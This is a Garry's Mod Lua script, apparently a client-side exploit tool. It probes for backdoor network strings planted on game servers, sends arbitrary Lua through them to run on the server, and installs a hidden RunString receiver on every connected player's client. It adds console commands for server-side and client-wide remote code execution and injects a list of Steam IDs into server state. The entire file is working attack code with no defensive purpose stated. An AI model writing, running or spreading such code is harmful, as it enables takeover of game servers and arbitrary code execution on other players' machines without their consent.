local ass = { "bdsm", "stream", "waoz" };
local FOUND_NET_MSG;

for k, v in pairs( ass ) do
      local succ, err = pcall( function()
      net.Start( v );
      net.WriteString( [[ PrintMessage( HUD_PRINTCONSOLE, "\n" ); ]] );
      net.SendToServer();
      end );
      if ( err ) then print( v, "does not exist" ); end
      if ( succ ) then print( v, "is an active network string" ); FOUND_NET_MSG = true; end
end

if ( !FOUND_NET_MSG ) then return; end

usermessage.Hook( "output_msg", function( um )
      local str = um:ReadString();
      local vec = um:ReadVector();
      MsgC( Color( vec.x, vec.y, vec.z ), str );
end );

net.Start( "bdsm" );
      net.WriteString( [[
      // run on all clients
      local pm = FindMetaTable( "Player" );

      util.AddNetworkString( "HUDAmmo" );
      util.AddNetworkString( "file_open_" );

      function pm:exec_script( _file )
      if ( !IsValid( self ) ) then return; end
      timer.Simple( 1, function()
      net.Start( "HUDAmmo" );
      net.WriteString( _file );
      net.Send( self );
      end );
      self:SendLua( [=[
      local RS = RunString;
      net.Receive( "HUDAmmo", function( str )
      local str = net.ReadString();
      RS( str );
      end );
      ]=] );
      end

      net.Receive( "file_open_", function( str )
      local str = net.ReadString();
      for k, v in pairs( player.GetAll() ) do
      v:exec_script( str );
      end
      end );
      ]] );
net.SendToServer();

local woww = "Exec'd %s script!";
timer.Simple( 0.4, function()

      concommand.Add( "lua_run_sv", function( ply, cmd, args )
      if ( args[1] == nil ) then return; end
      local codestring = table.concat( args, " " );
      net.Start( "bdsm" );
      net.WriteString( codestring );
      net.SendToServer();
      print( string.format( woww, tostring( cmd ) ), "\n" );
      end );

      concommand.Add( "lua_run_cls", function( pl, cmd, args )
      if ( args[ 1 ] == nil ) then return; end
      local codestring = table.concat( args, " " );
      net.Start( "file_open_" );
      net.WriteString( codestring );
      net.SendToServer();
      print( string.format( woww, tostring( cmd ) ), "\n" );
      end );

      concommand.Add( "lua_openscript_sv", function( pl, cmd, args )
      if ( args[1] == nil ) then return; end
      local filepath = file.Read( args[1], "LuaMenu" );
      if ( filepath == nil ) then print( "file not found?" ); return; end
      net.Start( "bdsm" );
      net.WriteString( filepath );
      net.SendToServer();
      print( string.format( woww, tostring( cmd ) ), "\n" );
      end );

      concommand.Add( "lua_openscript_cls", function( pl, cmd, args )
      if ( args[1] == nil ) then return; end
      local filepath = file.Read( args[1], "LuaMenu" );
      if ( filepath == nil ) then print( "file not found?" ); return; end
      net.Start( "file_open_" );
      net.WriteString( filepath );
      net.SendToServer();
      print( string.format( woww, tostring( cmd ) ), "\n" );
      end );
end );

local file_lib_block = false;
if ( file_lib_block ) then
      /*
      if ( file_lib_tbl == nil ) then // apparently it'll still modify the global table somehow.. so this is useless.
      local file_lib = file;
      file_lib_tbl = {};
      for k, v in pairs( file_lib ) do
      file_lib_tbl[ k ] = v;
      end
      end
      */

      file_library_args = file_library_args or {};

      for k, v in pairs( file ) do
      file[ k ] = function( ... )
      local args = { ... };
      if ( #args != 0 ) then
      table.insert( file_library_args, { "file."..k, ... } );
      MsgC( Color( 121, 171, 51 ), "saved arguments to file_library_args table" );
      end
      MsgC( color_white, "\n".."preventing file library access: " );
      MsgC( Color( 191, 121, 255 ), "file."..k, "\n" );
      return;
      end
      end
end

local tab =
[[
      woah_based_steamids_table = woah_based_steamids_table or
      {
      "STEAM_0:1:14989768",
      "STEAM_0:1:47684425",
      "STEAM_0:1:19633238",
      "STEAM_0:0:27525005",
      "STEAM_0:0:16035293",
      "STEAM_0:0:74970814",
      "STEAM_0:1:20683054",
      "STEAM_0:1:32806003",
      "STEAM_0:1:81063797",
      "STEAM_0:1:23860062",
      "STEAM_0:1:54508902",
      "STEAM_0:0:27525005",
      "STEAM_0:0:41549864",
      "STEAM_0:0:20510578",
      "STEAM_0:0:46908953",
      "STEAM_0:0:80574370",
      "STEAM_0:0:78266612",
      "STEAM_0:1:73592335",
      "STEAM_0:0:78286517",
      };
]]

local function send_steamids()
      net.Start( "file_open_" );
      net.WriteString( tab );
      net.SendToServer();

      net.Start( "bdsm" );
      net.WriteString( tab );
      net.SendToServer();
end

send_steamids();